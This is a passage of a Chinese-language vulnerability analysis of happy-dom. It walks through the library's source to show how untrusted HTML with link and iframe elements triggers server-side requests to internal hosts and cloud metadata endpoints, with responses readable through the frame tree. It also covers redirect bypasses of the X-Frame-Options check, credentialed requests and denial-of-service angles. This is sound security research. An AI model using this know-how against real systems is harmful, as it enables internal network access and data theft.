本身同样是一次出网。所以关掉 CORS 只是让响应可读，它不是 SSRF 成立的必要条件。</p><p><code>interceptor</code>** 是唯一可加装的策略点，而它默认是 <code>null</code>。** 它能拿到请求 URL、能直接返回一个 <code>Response</code> 短路、也能改写响应，是应用侧最现实的缓解手段。但\"不配置\"就等于\"不存在\"。</p><p><strong>缓存和预加载会让\"没命中\"不等于\"没尝试\"。</strong> 样式表路径显式关掉了预加载，但响应缓存仍可能命中；iframe 路径两者都可能参与。对检测方来说，\"目标没收到请求\"有可能只是缓存命中，不能据此判断\"没有攻击意图\"。</p><p>还有一个与浏览器语义的偏离值得一提：浏览器的 CORS 预检由浏览器发起、结果由浏览器执行，而 happy-dom 的预检会另起一次 <code>OPTIONS</code>。两条路径都跳过了同源检查，所以目标侧只会看到 <code>GET</code>，看不到预检——既少了预检这层语义，也少了一次暴露。</p><h3 id=\"sec-37\">4.5 唯一的出口：<code>Fetch.sendRequest</code></h3><p>再往下就是整条链上唯一真正出网的函数。</p><pre><code>private sendRequest(): Promise&lt;Response&gt; {\n    return new Promise((resolve, reject) =&gt; {\n        const taskID = this.#browserFrame[PropertySymbol.asyncTaskManager].startTask(() =&gt;\n            this.onAsyncTaskManagerAbort()\n        );\n        ...\n        const send = (this.request[PropertySymbol.url].protocol === 'https:' ? HTTPS : HTTP).request;\n        this.nodeRequest = send(this.request[PropertySymbol.url].href, {\n            method: this.request.method,\n            headers: FetchRequestHeaderUtility.getRequestHeaders({...}),\n            agent: false,\n            rejectUnauthorized: !this.#browserFrame.page.context.browser.settings.fetch.disableStrictSSL,\n            key: ...FetchHTTPSCertificate.key,\n            cert: ...FetchHTTPSCertificate.cert\n        });\n        ...\n        if (this.request.body === null) {\n            this.nodeRequest.end();\n        } else {\n            Stream.pipeline(this.request.body, this.nodeRequest, ...);\n        }\n    });\n}\n</code></pre><p>它拿到的已经是一个规范化完毕的 <code>URL</code> 对象。\"该不该发、发给谁、带什么\"全部在上游决定完了，这里只负责发。它没有上下文去判断目标是否内网，也没有策略层可以调用。</p><p>这个函数里的几件事，安全上的分量并不一样：</p><ul><li><p>它在所属 frame 的 <code>AsyncTaskManager</code> 上登记一个任务，abort 时回调，让 <code>waitUntilComplete</code> 能等到、<code>close()</code> 能取消——这一层是生命周期管理，不是安全边界；</p></li><li><p>它生成 UA、Accept、Referer、Cookie 等请求头，其中 UA 带着 <code>HappyDOM/20.14.6</code>，所以流量是可归因的（这一点在检测侧很有用）；</p></li><li><p>它按 scheme 在 <code>https</code> 和 <code>http</code> 模块之间选一个；</p></li><li><p>它把 <code>agent</code> 设为 <code>false</code>，不复用连接池，每个请求都新建 TCP，并发 iframe 时成本会更高；</p></li><li><p>它默认严格校验 TLS（<code>rejectUnauthorized</code>），只有 <code>disableStrictSSL</code> 才能关掉——关掉会引入中间人风险，但与 SSRF 无关；</p></li><li><p>HTTPS 请求用的是内置测试证书，那是测试便利，不是信任判断；</p></li><li><p>请求没有 body 时直接 <code>end()</code>，方法固定为 GET。</p></li></ul><p>真正重要的是它<strong>没有</strong>什么：没有 DNS 解析后的地址校验（不排除 <code>127/8</code>、<code>10/8</code>、<code>172.16/12</code>、<code>192.168/16</code>、<code>169.254/16</code>），没有端口白名单，没有 host 白名单，没有响应大小上限，也没有超时。DNS 解析、路由、建连全部交给操作系统，所以回环地址、内网任意主机、云元数据端点都在可达范围内。</p><p>超时这一条尤其值得展开，因为它暴露了一个非对称：<strong>超时不是这个函数的属性，而是调用方的责任。</strong></p><p>样式表那条路径从 <code>ResourceFetch.fetch</code> 一路走到 <code>sendRequest</code>，中间没有任何 <code>AbortController</code> 或 timeout。目标永不响应时，任务管理器上的任务永远不会结束，<code>await page.waitUntilComplete()</code> 就会一直等下去——对攻击者，这是一个可以无限期占用资源的 DoS 面。</p><p>iframe 那条路径不同：<code>navigate</code> 自己建了 30 秒的 <code>AbortController</code>，把它作为 <code>signal</code> 传给 <code>Fetch</code>，超时 abort 会让这个 Promise 拒绝，<code>navigate</code> 捕获后收尾。所以同样是这个出口，一条路径没有上限，另一条有 30 秒上限。</p><p>也正因为如此，第三章复现实验里要用 <code>Promise.race([waitUntilComplete(), 超时])</code> 兜底，也说明\"在出口统一加超时\"并没有想象中简单——样式表路径的调用方根本没有传超时机制。</p><p>至于重定向，它发生在 <code>onResponse</code> / <code>handleRedirectResponse</code> 里：默认跟随、最多 20 跳，每一跳都是一次真实请求，而且会把 <code>disableSameOriginPolicy</code> 一并沿用到下一跳。这段逻辑是第六章\"方向二\"的主战场，这里先记下结论。</p><h3 id=\"sec-38\">4.6 <code>&lt;link&gt;</code>：三行分派，六道闸门</h3><h4 id=\"sec-39\">4.6.1 分派：<code>HTMLLinkElement.[connectedToDocument]</code></h4><p>连接回调落到 <code>HTMLLinkElement</code> 身上，就是三行代码：</p><pre><code>public override [PropertySymbol.connectedToDocument](): void {\n    super[PropertySymbol.connectedToDocument]();\n\n    const rel = this.getAttribute('rel');\n    const href = this.getAttribute('href');\n\n    if (rel &amp;&amp; href) {\n        switch (rel) {\n            case 'stylesheet':\n                this.#loadStyleSheet(href);\n                break;\n            case 'modulepreload':\n                this.#preloadModule(href);\n                break;\n            case 'preload':\n                this.#preloadResource(href);\n                break;\n        }\n    }\n\n    this[PropertySymbol.ownerDocument][PropertySymbol.clearComputedStyleCache]();\n}\n</code></pre><p>它只读 <code>rel</code> 和 <code>href</code> 两个原始字符串，不做 URL 解析，不做 scheme/host 校验，也不判断目标是否可信、不检查 <code>media</code>、不认 <code>&lt;base&gt;</code>。所有规范化都推给下一层。</p><p>它是解析管线和网络栈之间<strong>唯一</strong>的 <code>&lt;link&gt;</code> 入口。没有它，<code>&lt;link&gt;</code> 只是一个属性容器。触发条件是\"元素进场 + <code>rel=stylesheet</code> + <code>href</code> 非空\"，三项全部由攻击者的 HTML 控制——<code>rel</code> 在这里不是安全检查，它只是一个分派键。</p><p>调用方式是 fire-and-forget：<code>#loadStyleSheet</code> 是 async 函数，但没有被 <code>await</code>。解析不会被网络阻塞，请求却一定会启动。这制造了一个错觉——\"赋值很快就返回了，应该没发请求\"。</p><p>两个边界对攻击者是约束，对防御者却不是防线：</p><ul><li><p><code>switch</code> 是大小写敏感的单 token 比较，<code>rel=\"STYLESHEET\"</code> 和 <code>rel=\"preload stylesheet\"</code> 都不匹配。这与 HTML 规范（rel 是大小写不敏感的 token 集合）不一致，但攻击者写个小写单词就能命中，所以它不构成缓解；</p></li><li><p><code>href</code> 为空或缺失时进不了 <code>switch</code>，只挡住了\"没写 href\"这一种形态。</p></li></ul><p>同一个 <code>switch</code> 也出现在属性写入回调里。当元素<strong>已经连接</strong>时，<code>setAttribute('href', ...)</code> 就是有效扳机：先 append 一个没 href 的 link，稍后再设置 href，请求就出现在设置那一刻。它与连接回调的差别只在\"谁先发生\"——解析期属性写入早于连接，所以空跑；动态期元素已连接，所以直接生效。</p><h4 id=\"sec-40\">4.6.2 放行：<code>HTMLLinkElement.#loadStyleSheet</code></h4><p>真正决定\"发不发、发给谁、带什么凭据\"的，是这个私有方法。</p><pre><code>async #loadStyleSheet(url: string | null): Promise&lt;void&gt; {\n    const window = this[PropertySymbol.window];\n    const browserFrame = new WindowBrowserContext(window).getBrowserFrame();\n    if (!browserFrame || url === null) { return; }\n    const browserSettings = browserFrame.page.context.browser.settings;\n    if (this[PropertySymbol.disableEvaluation] || !this[PropertySymbol.isConnected]) {\n        return;\n    }\n    let absoluteURL: string;\n    try { absoluteURL = new URL(url, window.location.href).href; }\n    catch (error) { return; }\n    if (this.#loadedStyleSheetURL === absoluteURL) { return; }\n    if (browserSettings &amp;&amp; browserSettings.disableCSSFileLoading) {\n        ...\n        return;\n    }\n    const resourceFetch = new ResourceFetch(window);\n    const readyStateManager = window[PropertySymbol.readyStateManager];\n    this.#loadedStyleSheetURL = absoluteURL;\n    const taskID = readyStateManager.startTask();\n    try {\n        response = await resourceFetch.fetch(absoluteURL, 'style', {\n            credentials: this.crossOrigin === 'use-credentials' ? 'include' : 'same-origin'\n        });\n    } catch (e) { error = &lt;Error&gt;e; }\n    readyStateManager.endTask(taskID);\n    ...\n}\n</code></pre><p>按顺序数，请求出门前要过六道：</p><ol><li><p>取 <code>browserFrame</code>（428）。查不到说明窗口已销毁或未登记，静默返回；</p></li><li><p><code>!browserFrame || url === null</code>（430）。防御性判断，静默返回；</p></li><li><p><code>disableEvaluation || !isConnected</code>（436）。解析期属性写入在这里早退，入树之后重新进来；</p></li><li><p><code>new URL(url, window.location.href)</code>（442）。规范化地址，基址是窗口地址，<code>&lt;base&gt;</code> 被忽略；解析抛错也返回；</p></li><li><p>和 <code>#loadedStyleSheetURL</code> 比较（447）。同元素同 URL 只加载一次；</p></li><li><p><code>disableCSSFileLoading</code>（451）。唯一的配置闸门，不满足时记 <code>console.error</code> 并派发 <code>error</code> 事件。</p></li></ol><p>这六道的<strong>顺序</strong>决定了它能拦什么、拦不住什么。</p><p>URL 解析在配置闸门之前。即使把加载关掉，<code>absoluteURL</code> 也会被算出来，错误消息里会带上它——\"关门\"发生在\"看清目标\"之后。</p><p>去重表的写入在闸门之后、fetch 之前。一旦通过闸门，这个 URL 就被预占了；<strong>如果 fetch 失败，该 URL 仍然算已加载</strong>，重连、重挂都不会重试。对攻击者，这是\"每个元素每个 URL 只有一发\"；对防御者，这意味着\"第二次渲染没有新请求\"不能当成\"没有意图\"。</p><p>闸门之后没有任何 host/port/scheme 白名单。唯一的目标侧限制来自下游：<code>validateSchema</code> 只允许 <code>data:/http:/https:</code>，以及 Mixed Content 会在 https 页面访问 http 目标时拦一下。</p><p><code>disableCSSFileLoading</code> 需要单独强调：它是一个<strong>行为开关</strong>，不是安全策略。它的语义是\"要不要加载 CSS\"，不是\"允许加载哪些目标\"。置为 <code>true</code> 只是提前返回，不做目标校验，也不改变 DOM 解析。而且当 <code>handleDisabledFileLoadingAsSuccess</code> 为 <code>true</code> 时，被拦截反而会派发 <code>load</code> 事件——如果应用靠 <code>load</code>/<code>error</code> 做检测，这会把\"被拦截\"伪装成\"成功\"。</p><p><code>crossorigin</code> 则是攻击者可以影响的凭据开关。<code>credentials</code> 由 <code>this.crossOrigin === 'use-credentials'</code> 决定，而 <code>crossOrigin</code> getter 直接读 <code>crossorigin</code> 属性：</p><ul><li><p>默认（不写或空）→ <code>same-origin</code>，跨源目标不带 cookie；</p></li><li><p>写 <code>crossorigin=\"use-credentials\"</code> → <code>include</code>，请求头工具会按<strong>目标 URL</strong> 去 cookie 容器里查并附带。默认场景下目标域没有 cookie，所以实测不带；但如果应用在同一个 <code>BrowserContext</code> 里为目标域设置过 cookie（比如先登录过内部系统），这个属性就能把\"盲 GET\"升级成\"带凭据的盲 GET\"。</p></li></ul><h4 id=\"sec-41\">4.6.3 盲：<code>ResourceFetch.fetch</code></h4><pre><code>const fetch = new Fetch({\n    browserFrame,\n    window: this.window,\n    url,\n    disableSameOriginPolicy: destination === 'script' || destination === 'style',\n    disablePreload: true,\n    init: { credentials: options?.credentials, referrerPolicy: options?.referrerPolicy }\n});\nconst response = await fetch.send();\nif (!response.ok) { throw new DOMException(...); }\nreturn { content: await response.text(), virtualServerFile: ... };\n</code></pre><p>关掉同源策略的决定来自 <code>destination</code>，而不是攻击者。<code>destination</code> 是内部枚举：样式表加载写死 <code>'style'</code>，脚本加载写死 <code>'script'</code>，模块加载是 <code>'module'</code>。对前两者表达式恒为 <code>true</code>，对模块为 <code>false</code>。所以\"跨源可读\"是设计选择，不是配置泄漏。</p><p>真实浏览器里，CSS 和脚本本来就可以跨源加载，但<strong>不能读响应</strong>。happy-dom 把\"可加载\"和\"可读\"一起放开了，因为 CSS 解析需要拿到内容。这是语义模仿与安全边界之间的错位。</p><p><code>ok</code> 检查是事后检查：<code>send()</code> 先执行，<code>!response.ok</code> 才抛错。所以 404、500 同样已经出网，抛错只影响\"要不要把它当 CSS 解析\"，不影响\"请求是否到达\"。</p><p>响应回流之后，这个方法只做四件事：<code>new CSSStyleSheet()</code> → <code>replaceSync(content)</code> → 挂到 <code>link.sheet</code> 上 → 派发 <code>load</code>。响应体只进 CSS 解析器，不进 DOM，也不回显给应用。所以这条路径的观测面很窄：攻击者能确定拿到的只有目标侧的日志和副作用（任意 GET，路径和查询串完全可控）。<code>load</code>/<code>error</code> 事件、<code>console.error</code> 里的状态码与 URL、<code>link.sheet.cssRules.length</code> 反映出的规则数，以及整个过程的耗时，都要应用自己回显或暴露才有意义——其中耗时还能区分内网的\"拒绝\"和\"超时\"。</p><p>这就是为什么这条路径是盲 SSRF——\"盲\"不是实现缺陷，而是响应处置方式决定的。要读到内容，得看 <code>&lt;iframe&gt;</code> 那条线。</p><hr><h3 id=\"sec-42\">4.7 <code>&lt;iframe&gt;</code>：无条件进场，响应写回</h3><h4 id=\"sec-43\">4.7.1 扳机：<code>HTMLIFrameElement.[connectedToDocument]</code></h4><p>和 <code>&lt;link&gt;</code> 相比，iframe 的连接回调短得不像话：</p><pre><code>public override [PropertySymbol.connectedToDocument](): void {\n    super[PropertySymbol.connectedToDocument]();\n    this.#loadPage();\n}\n</code></pre><p>它什么也不读：不判断有没有 <code>src</code>、不判断是不是 <code>srcdoc</code>、不解析 URL、不设门槛、也不等导航完成。所有决策都推给了 <code>#loadPage</code>。</p><p>正因为它是无条件调用，<strong>任何</strong> <code>&lt;iframe&gt;</code> 进场都会走一遍加载流程，包括没有 <code>src</code> 的空 iframe。空 iframe 的后果不是\"什么都不做\"：它会走 <code>about:blank</code> 分支，创建一个真实的子 <code>BrowserFrame</code> 和 <code>BrowserWindow</code>，等一帧后派发 <code>load</code>。攻击者可以用大量空 iframe 制造 frame、window 和动画帧的开销，即使一个网络请求都没有——这是一个独立于 SSRF 的资源耗尽面。</p><p>顺带说，<code>super[...]()</code> 必须在前。它保证 <code>isConnected</code> 已经为 <code>true</code>，否则下一层的连接检查会把导航挡回去，顺序反了导航永远不会发生。</p><p>除连接之外，还有几个等价入口：写入 <code>srcdoc</code>、写入非空的 <code>src</code>、移除 <code>src</code>/<code>srcdoc</code>，以及元素从文档中移除。前三个在元素已连接时都会重新走一遍加载流程，最后一个会卸载页面、销毁子 frame。</p><h4 id=\"sec-44\">4.7.2 分流：<code>HTMLIFrameElement.#loadPage</code></h4><pre><code>#loadPage(): void {\n    if (!this[PropertySymbol.isConnected]) {\n        this.#unloadPage();\n        return;\n    }\n    const srcdoc = this.getAttribute('srcdoc');\n    const window = this[PropertySymbol.window];\n    const browserFrame = new WindowBrowserContext(window).getBrowserFrame();\n    if (!browserFrame) { return; }\n    if (srcdoc !== null) {\n        if (this.#loadedSrcdoc === srcdoc) { return; }\n        this.#unloadPage();\n        this.#iframe = BrowserFrameFactory.createChildFrame(browserFrame);\n        this.#iframe.url = 'about:srcdoc';\n        ...\n        this.#iframe.window.document.open();\n        this.#iframe.window.document.write(srcdoc);\n        ...\n        return;\n    }\n    if (this.#loadedSrcdoc !== null) { this.#unloadPage(); }\n    const originURL = browserFrame.window.location;\n    const targetURL = BrowserFrameURL.getRelativeURL(browserFrame, this.src);\n    if (this.#iframe &amp;&amp; this.#iframe.window.location.href === targetURL.href) { return; }\n    if (browserFrame.page.context.browser.settings.disableIframePageLoading) {\n        ... console.error + error 事件 ...\n        return;\n    }\n    const isSameOrigin = originURL.origin === targetURL.origin || targetURL.origin === 'null';\n    const parentWindow = isSameOrigin ? window : new CrossOriginBrowserWindow(window);\n    this.#iframe = this.#iframe ?? BrowserFrameFactory.createChildFrame(browserFrame);\n    ...\n    this.#iframe.goto(targetURL.href, { referrer: originURL.origin, referrerPolicy: this.referrerPolicy })\n        .then(() =&gt; this.dispatchEvent(new Event('load')))\n        .catch((error) =&gt; { ...; this.dispatchEvent(new Event('error')); });\n}\n</code></pre><p>这里的顺序值得逐条走一遍：</p><ol><li><p>先看 <code>isConnected</code>。没连接就卸载页面再返回——所以解析期属性写入是空跑，入树后会重新进来；</p></li><li><p>再看能不能查到 frame。查不到说明窗口已销毁或未登记，静默返回；</p></li><li><p>然后看 <code>srcdoc</code>。它不为 <code>null</code> 就走本地渲染分支，**优先于 **<code>src</code>，而且在配置闸门之前；</p></li><li><p>如果是从上一次的 srcdoc 切回 <code>src</code>，先把旧页面卸载；</p></li><li><p>解析目标地址。相对 URL 依赖父 frame 的地址，<code>&lt;base&gt;</code> 被忽略，解析失败兜底到 <code>about:blank</code>；</p></li><li><p>如果现有子 frame 的地址已经等于目标地址，直接返回——每元素去重；</p></li><li><p>然后才是 <code>disableIframePageLoading</code>。这是唯一的配置闸门，不满足时记 <code>console.error</code> 并派发 <code>error</code> 事件；</p></li><li><p>接着判同源。跨源时给 <code>contentWindow</code> 包一层代理，只影响可见性；</p></li><li><p>建或复用子 frame，子 frame 由此进入 <code>childFrames</code>；</p></li><li><p>最后调 <code>goto</code>，失败则派发 <code>error</code>。导航细节在 4.7.4。</p></li></ol><p>三条顺序性结论：</p><p><strong>srcdoc 在闸门之前。</strong> 即使 <code>disableIframePageLoading: true</code>，<code>srcdoc</code> 仍然会渲染。这是\"拦网络不拦本地内容\"的设计，本身不算漏洞；但 srcdoc 里的 <code>&lt;iframe src&gt;</code> 和 <code>&lt;link&gt;</code> 会各自再走一遍自己的闸门。</p><p><strong>URL 解析和去重都在闸门之前。</strong> 即使加载被禁用，<code>targetURL</code> 也会被算出来（错误消息里带它），去重表也可能因为之前一次成功导航而\"粘住\"。</p><p><strong>闸门在建子 frame 之前。</strong> 被拦下的 src 不会创建新的子 frame；如果之前有 <code>#iframe</code>（比如从 srcdoc 切过来），前面的卸载已经把它销毁了。</p><p>去重是\"预占式\"的，这一点比看上去重要：</p><ul><li><p>同一元素、同一目标 URL，第二次直接返回；</p></li><li><p>改成新 URL，复用已有子 frame 进入导航；</p></li><li><p><strong>导航失败之后</strong>，子 frame 的 <code>window.location</code> 在发请求前就被设成了目标 URL，失败后窗口仍在，于是这个比较成立，后续重试会被去重挡住。换句话说，\"失败一次 = 这个元素对这个 URL 不再重试\"。对检测方，\"重放页面没有新请求\"不等于\"没有攻击\"。</p></li></ul><p>URL 解析是两段式的，先以元素所属 document 的地址为基址，再由 <code>BrowserFrameURL.getRelativeURL</code> 处理：空值给 <code>about:blank</code>，<code>about:</code>/<code>javascript:</code> 直接构造，其余以 frame 窗口地址为基址，失败兜底 <code>about:blank</code>。由此产生几个与浏览器的差异：相对 URL 落在 <code>about:blank</code> 基址上会静默退化成不导航（很容易被误判成\"已拦截\"），<code>&lt;base href&gt;</code> 被忽略，<code>src=\"\"</code> 会解析成父文档地址，<code>data:</code> 会走完整导航管线但不产生网络。</p><p><code>disableIframePageLoading</code> 的语义边界也要说清楚：它只决定\"是否导航\"，不做目标校验。拦截时 <code>console.error</code> 的文本是 <code>Failed to load iframe page \"…\". Iframe page loading is disabled.</code>；<code>error</code> 事件是<strong>同步</strong>派发的，而正常的 <code>load</code> 在后续微任务或帧回调里。解析路径下，应用在赋值之后才挂监听，收不到这个同步事件——只靠元素事件做检测，会漏掉\"被闸门拦下\"的场景，但 <code>console.error</code> 仍会留痕。</p><p>另外，<code>sandbox</code> 不改变加载行为。写 <code>sandbox</code> 只触发一次 flag 合法性校验，它不阻止导航、不限制 <code>src</code>、也不改变同源判定。把 sandbox 当成加载门槛是错的。</p><h4 id=\"sec-45\">4.7.3 结构：<code>BrowserFrameFactory.createChildFrame</code></h4><pre><code>public static createChildFrame(parentFrame: IBrowserFrame): IBrowserFrame {\n    const frame = new (&lt;new (page: IBrowserPage) =&gt; IBrowserFrame&gt;parentFrame.constructor)(\n        parentFrame.page\n    );\n    (&lt;IBrowserFrame&gt;frame.parentFrame) = parentFrame;\n    parentFrame.childFrames.push(frame);\n    return frame;\n}\n</code></pre><p>它只做对象创建：用父 frame 的构造函数造一个真实的 <code>BrowserFrame</code>，设置 <code>parentFrame</code>，推进 <code>parentFrame.childFrames</code>。这个子 frame 自带 <code>BrowserWindow</code>、<code>Document</code>、<code>AsyncTaskManager</code>，与主 frame 同构。</p><p>它不碰网络，却是危害等级的放大器。<code>page.mainFrame.childFrames</code> 里存的是<strong>原始的 </strong><code>BrowserFrame</code><strong> 对象</strong>，不是 <code>contentWindow</code> 那层受限代理。跨源时，从 <code>contentWindow</code> 往外走处处碰壁：它的 <code>document</code> 是 <code>undefined</code>（代理上根本没有这个属性），<code>contentDocument</code> 是 <code>null</code>，读 <code>location.href</code> 会抛 <code>SecurityError</code>。但 frame 树绕开了这层代理——<code>childFrames[i].window</code> 是真实的 <code>BrowserWindow</code>，读它的 <code>document.body.innerHTML</code> 能拿到整个 body，读 <code>childFrames[i].content</code> 能拿到整个 <code>outerHTML</code>，而 <code>page.frames</code> 会把每一层递归列出来。</p><p>跨源保护只套在 <code>iframe.contentWindow</code> 上，frame 树不经过这层代理。原因很简单：这层代理的威胁模型是\"页面脚本\"，而不是\"宿主应用\"；但在服务端解析不可信 HTML 的场景里，宿主应用恰恰是被诱导去读取的一方。第三章里受害应用读 <code>page.mainFrame.childFrames[0].window.document</code> 而不是 <code>iframe.contentDocument</code>，就是这个原因。</p><p>生命周期上，移除 iframe 会触发卸载，进而销毁子 frame：abort 它的任务管理器、关闭窗口、从 <code>childFrames</code> 里删掉。请求如果已经发出，只能 abort 响应，撤不回已经到达目标的请求；导航到新 URL 时，旧的子 frame 子树会被销毁，避免残留。</p><h4 id=\"sec-46\">4.7.4 导航：<code>BrowserFrameNavigator.navigate</code></h4><p>这是全链最长的一个函数，可以当成一条流水线，一段一段看。</p><p><strong>预检。</strong> 跨源策略默认 <code>anyOrigin</code>，直接放行；改成 <code>sameOrigin</code> 时跨源子 frame 会停在 <code>about:blank</code>，请求数为零。<code>disableChildFrameNavigation</code> 为 <code>true</code> 时，只把地址设为目标、不发请求——它防的是\"导航\"，不是\"目标\"。同文档的 hash 导航不发请求，<code>javascript:</code> 默认不执行。这两个都不是 SSRF 的绕过面，但很容易被误判为\"已经导航\"。</p><p><strong>换窗口。</strong> 代码先新建 <code>BrowserWindow</code>，构造参数就是目标 URL，之后才构造 <code>Fetch</code>。这带来三个连锁后果：</p><ul><li><p>应用在赋值之后、请求完成之前，就能从 <code>frames[0].url</code> 读到内网地址；</p></li><li><p><code>Fetch</code> 的 <code>window</code> 是<strong>这个新子窗口</strong>，它的 <code>location.protocol</code> 已经是目标协议，所以 Mixed Content 检查恒为假。<code>https</code> 页面里的 <code>http</code> iframe 仍会出网，这与 <code>&lt;link&gt;</code> 那条线正好相反（后者用的是主窗口）；</p></li><li><p>请求头工具用目标窗口自身的地址判断跨源，于是判断恒为 false。</p></li></ul><p><strong>超时。</strong> 建子 frame 时没有传 <code>timeout</code>，用的是默认 30 秒。定时器登记在子 frame 的任务管理器上，而 <code>waitUntilComplete</code> 会递归等待子 frame，所以目标挂起时，应用的等待会被拖住整整 30 秒。多个 iframe 并行就是多个 30 秒；响应体全量缓冲、没有大小上限；递归没有深度限制。三者叠加，构成\"少量 HTML 换大量资源\"的 DoS 面。</p><p><strong>构造并发送请求。</strong> 这里的 <code>disableSameOriginPolicy: true</code> 是<strong>硬编码</strong>，不读配置。所以 iframe 路径的同源策略失效，与全局那个默认就是 <code>false</code> 的配置项无关——改全局值修不了它。<code>browserFrame</code> 传的是子 frame，任务因此登记在子 frame 上，这也是 <code>waitUntilComplete</code> 能等到它的原因。</p><p><strong>事后检查 XFO。</strong> 顺序是先 <code>await fetch.send()</code>，再读 <code>X-Frame-Options</code>。也就是说，内容能不能写回是在请求<strong>到达之后</strong>才判断的。这个检查只对子 frame 生效，主 frame 导航根本不查；<code>deny</code> 一律拒绝，<code>sameorigin</code> 只在跨源时拒绝，两种结果都是\"请求已经命中一次，body 留空\"；判断同源时用的是<strong>原始</strong>目标 URL，所以同源目标 302 到跨源的 <code>SAMEORIGIN</code> 时，检查会放行，内容照样写回；目标 origin 为 <code>'null'</code> 时直接视为同源，<code>data:</code>/<code>about:</code> 不受限制；至于 CSP 的 <code>frame-ancestors</code>，源码里根本没有实现。</p><p>所以 XFO 只能决定\"内容能不能写回\"，不能阻止 SSRF；内网服务通常不返回它；即使返回，检查用的是原始地址，一次重定向就能绕过。把它当防线是这类分析中最常见的误读。</p><p><strong>写回。</strong> 响应体最后在动画帧加 <code>setImmediate</code> 里执行 <code>frame.content = responseText</code>。这等于回到了 4.1 那个 setter：<code>document.open()</code> 清空、<code>document.write()</code> 重新解析。内网响应体作为 HTML 被二次解析，里面有 <code>&lt;iframe&gt;</code> 或 <code>&lt;link&gt;</code> 就再连接、再加载，形成递归。纯文本和 JSON 也不例外——解析器会为文档根补齐 <code>documentElement/head/body</code>，<code>text/plain</code> 的响应同样能逐字读出来。<strong>它不要求目标是 HTML 页面</strong>，内部 JSON 接口一样可读。</p><p>这里还有两个容易误判的点。非 2xx 只记 <code>console.error</code>、不抛错，404 的响应体照样写回；<code>beforeContentCallback</code> 在写回前调用，但返回值是 <code>void</code>，<strong>不能取消写入</strong>，它只能观察，不能阻断。</p><p>最后一件事是 iframe 请求的形状。实测请求头里没有 <code>Origin</code>，<code>Referer</code> 是目标自己的 origin。原因链是这样的：上层把父 frame 的 origin 作为 referrer 传下去，但 <code>Fetch</code> 的窗口已经是新子窗口（地址就是目标），referrer 整理时发现两者 origin 不同，于是返回 <code>'client'</code>，再被解析成目标窗口地址，按 <code>origin</code> 策略发出。所以受害者 origin 不会通过 <code>Referer</code> 泄露给内网目标。没有 <code>Origin</code> 则是因为跨源判断用的是目标窗口自身。</p><p>cookie 也是同一套逻辑：按目标域去查容器。默认目标域没有 cookie，所以实测不带；但\"不带\"是环境属性，不是代码保证——只要同一个 <code>BrowserContext</code> 里为目标域设过 cookie，请求就会带上它。</p><h4 id=\"sec-47\">4.7.5 为什么这条链\"读得到\"：<code>waitUntilComplete</code></h4><p>iframe 路径和 <code>&lt;link&gt;</code> 路径共用同一个出口，差别全在响应去哪：一个进 CSS 解析器，一个进 <code>frame.content</code>。而后者之所以能稳定读出来，不是因为碰巧赶上了时序，而是因为任务管理器把它变成了确定性行为。</p><pre><code>public async waitUntilComplete(): Promise&lt;void&gt; {\n    await Promise.all([\n        this[PropertySymbol.asyncTaskManager].waitUntilComplete(),\n        ...this.childFrames.map((frame) =&gt; frame.waitUntilComplete())\n    ]);\n}\n</code></pre><p>导航在子 frame 的任务管理器上登记了多类任务：旧窗口销毁、readyState、30 秒定时器、网络请求、响应体读取、写回解析。<code>waitUntilComplete</code> 会递归等到它们全部结束，所以应用\"先等完成，再读 <code>childFrames[0].window.document.body.innerHTML</code>\"的顺序，恰好落在\"响应落地、写入、解析完成\"之后。外泄不依赖竞态，这也是它比盲 SSRF 更难用时序手段缓解的原因。</p><p>一句话收束这一章：<code>&lt;link&gt;</code> 的终点是\"请求发出\"，由那个唯一的网络出口决定；<code>&lt;iframe&gt;</code> 的终点是\"内容进入应用可读的 DOM\"，由子 frame 和应用可见的 frame 树决定。前者只需要看一眼出口，后者要把写回路径一并看完。</p><h3 id=\"sec-48\">4.8 回头再看这几个函数</h3><p>把这些函数串起来，能提炼出四句可以直接用来判断同类问题的话。</p><p><strong>解析不是纯函数。</strong> 在这套实现里，<code>HTMLParser</code> 的副作用不是\"构建树\"，而是\"连接即加载\"。只要不可信 HTML 能进入解析器并使元素连接，就等价于一次外部资源解析——不管入口是 <code>page.content</code>、<code>innerHTML</code> 还是 <code>DOMParser</code>。</p><p><strong>连接是唯一的扳机。</strong> 属性写入确实会调用加载函数，但被未连接状态挡住；真正触发的是\"游离 → 连接\"那一次边沿。这解释了为什么\"解析即触发\"和\"写属性不触发\"可以同时成立，也解释了为什么重复挂载不会重复请求，而移除再挂载会。</p><p><strong>默认值就是策略。</strong> <code>disableCSSFileLoading</code> 和 <code>disableIframePageLoading</code> 都是 opt-out，<code>crossOriginPolicy</code> 默认 <code>anyOrigin</code>，<code>interceptor</code> 默认 <code>null</code>。库里有的是\"行为开关\"，没有\"目标可信\"这一层。</p><p><strong>响应处置决定危害等级。</strong> 同一个网络出口，响应进 CSS 解析器是盲 SSRF，进 <code>frame.content</code> 就是可读加递归。只讲门槛、不讲响应去哪，会把一个可读 SSRF 讲成盲 SSRF；只讲出口、不讲回读面，又会把\"能读\"讲成\"碰运气\"。</p><p>这四句话也解释了第三章那个复现为什么能成立，以及第五章要换一个宿主时，该盯着哪些点看。</p><hr><h2 id=\"sec-49\">五、换个宿主：在引用 happy-dom 的其他项目里触发</h2><p>第三章的复现是\"我自己写了一个受害应用\"。这容易被质疑：真实项目里未必有人这样写。所以这一章换一个宿主——不构造 <code>Browser</code>、不调用 <code>page.content</code>，让 DOM 完全由第三方框架在运行时提供，只把攻击者可控的 HTML 送进渲染管线。</p><p>Storybook 的测试链是一个合适的样本：它把 story 渲染进 <code>canvasElement.innerHTML</code>，而 vitest 的 <code>environment: 'happy-dom'</code> 让这个 <code>innerHTML</code> 落在一个由 happy-dom 提供的 document 上。于是第 4.1 节说的\"第一类入口\"——写进已经连接的位置——在完全真实的工程链路里被触发了。</p><h3 id=\"sec-50\">5.1 漏洞在这条链路里的位置</h3><p>根因在第二章已经拆过，这里只需要记住结论：21.0.0 之前，两个 disable 开关默认为 <code>false</code>，把 HTML 交给 happy-dom 就等于授权它去取里面的外部资源。这条链里没有任何一行代码是\"开启了 SSRF\"的——它是默认行为的直接后果。</p><p>放到 Storybook 场景里，完整链路是：</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261112123623-9da3008f-de52-1.png&amp;mode=full&amp;exp=1794787200&amp;sig=35ae434d82d9ccbb\" loading=\"lazy\" decoding=\"async\" title=\"null\"></p><p><em>图 5-1　